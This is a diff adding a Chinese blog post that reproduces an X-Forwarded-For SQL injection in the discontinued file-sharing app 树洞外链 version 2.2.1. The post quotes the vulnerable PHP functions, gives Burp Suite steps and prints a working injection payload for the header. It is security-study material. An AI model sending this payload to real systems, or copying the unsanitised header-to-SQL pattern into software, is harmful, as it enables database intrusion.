@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>树洞外链X_FORWARDED_FOR注入漏洞复现</title>
+      <link href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/"/>
+      <url>/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h1><p>树洞外链现在已经停止更新，作者又开发了<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">Cloudreve</a>，有兴趣可以了解一下。<br>回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。<br>树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。</p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>在<code>/includes/function.php</code>的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 </p><pre><code>function get_real_ip(){$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])){$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];}if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {$ips = explode (&quot;, &quot;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }for ($i = 0; $i &lt; count($ips); $i++) {if (!eregi (&quot;^(10|172\.16|192\.168)\.&quot;, $ips[$i])) {$ip = $ips[$i];break;}}}return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);}</code></pre><p>然后在<code>includes/save.php</code>  20行左右发现调用<code>get_real_ip()</code>函数</p><pre><code>$ip=get_real_ip();$dd=date(&#39;Y-m-d H:i:s&#39;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &#39;$rand&#39;, &#39;$ip&#39;, &#39;$dd&#39;, &#39;0&#39; , &#39;$uploadUser&#39;, &#39;$policyId&#39;);&quot;);$stmt-&gt;bind_param(&#39;s&#39;, $ming);</code></pre><hr><h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>下载树洞外链源码，本地搭建环境。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png" alt></p><p>注册账号登陆，然后打开burpsuite，关掉拦截<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png" alt><br>然后上传文件，在HTTP history里找到<code>/includes/save.php</code>,发送到Repeater<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png" alt><br>构造payload并发送</p><pre><code>X-Forwarded-For: 1.1.1.1′,user(),’0′,1,1); #ming=aa</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png" alt></p><p>然后在<strong>我的文件</strong>里面可以看到执行结果<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/179363.html" target="_blank" rel="noopener">代码审计树洞X_FORWARDED_FOR注入</a><br><a href="https://blog.csdn.net/qq_21510303/article/details/91886405" target="_blank" rel="noopener">代码审计之头部注入X-Forwarded-For</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Information Security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 复现 </tag>
+            
+            <tag> 树洞外链 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>zzzphp V1.6.1 远程代码执行漏洞复现</title>
       <link href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/"/>
       <url>/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/</url>
